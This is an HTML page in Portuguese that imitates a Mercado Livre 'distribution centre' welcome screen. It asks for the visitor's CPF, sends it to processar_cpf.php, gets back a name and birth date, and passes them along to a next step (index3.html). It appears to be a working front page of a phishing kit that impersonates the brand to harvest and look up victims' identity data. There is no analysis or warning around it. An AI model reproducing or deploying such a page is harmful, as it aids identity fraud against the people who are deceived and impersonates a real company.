<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bem-vindo - Mercado Livre</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #ffffff, #ffffff);
            margin: 0;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 0px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0);
            text-align: center;
            width: 95%;
            max-width: 300px;
            animation: fadeIn 1s ease-in-out;
        }
        .logo {
            max-width: 150px;
            margin-bottom: 15px;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #2238ff;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 16px;
            margin-bottom: 20px;
        }
        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccccccf8;
            border-radius: 8px;
            font-size: 16px;
            text-align: center;
            transition: border-color 0.3s;
        }
        input:focus {
            border-color: #ffde22;
            outline: none;
        }
        button {
            width: 90%;
            padding: 12px;
            background-color: #f3b408;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #e64a19;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="gh.png" alt="Mercado Livre" class="logo">
        <h1>Bem-vindo à Central de Distribuição Mercado Livre</h1>
        <p>Por favor, insira seu CPF para continuar.</p>
        <input type="text" id="cpf" placeholder="Digite seu CPF" maxlength="14">
        <button onclick="prosseguir()">Prosseguir</button>
    </div>
    
    <script>
        function formatCPF(cpf) {
            return cpf.replace(/\D/g, "").slice(0, 11); // Remove tudo que não for número e limita a 11 dígitos
        }
        
        document.getElementById("cpf").addEventListener("input", function(e) {
            e.target.value = formatCPF(e.target.value);
        });

        function prosseguir() {
            let cpf = document.getElementById("cpf").value.replace(/\D/g, ""); // Remove pontos e traço
            if (cpf.length === 11) {
                fetch("processar_cpf.php", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: "cpf=" + encodeURIComponent(cpf) // Enviamos apenas os números
                })
                .then(async response => {
                    let data = null;
                    try { data = await response.json(); } catch (e) { data = null; }
                    if (!response.ok || !data) {
                        alert((data && data.error) || "Erro ao consultar CPF. Tente novamente mais tarde.");
                        return;
                    }
                    if (data.nome) {
                        sessionStorage.setItem('ml_nome', data.nome);
                        sessionStorage.setItem('ml_cpf', data.cpf || cpf);
                        if (data.nascimento) sessionStorage.setItem('ml_nascimento', data.nascimento);
                        const qs = new URLSearchParams({
                            nome: data.nome,
                            cpf: data.cpf || cpf,
                            nascimento: data.nascimento || ''
                        });
                        window.location.href = 'index3.html?' + qs.toString();
                    } else {
                        alert(data.error || "CPF não encontrado.");
                    }
                })
                .catch(error => {
                    alert("Erro ao consultar CPF. Tente novamente mais tarde.");
                    console.error("Erro:", error);
                });
            } else {
                alert("Por favor, insira um CPF válido (11 números).");
            }
        }
    </script>
</body>
</html>
